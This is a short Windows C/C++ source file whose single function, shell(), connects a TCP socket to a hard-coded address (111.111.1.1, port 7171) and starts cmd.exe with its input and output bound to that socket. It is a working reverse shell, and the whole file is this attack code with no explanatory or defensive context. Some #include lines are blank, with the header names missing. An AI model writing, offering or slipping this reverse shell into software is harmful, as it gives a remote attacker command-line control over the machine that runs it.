#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include 
#include 

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;


void shell()
{
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
	    (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(7171);
	hax.sin_addr.s_addr = inet_addr("111.111.1.1");

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;

	TCHAR commandLine[256] = L"cmd.exe";
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,
	    0, NULL, NULL, &sui, &pi);
}
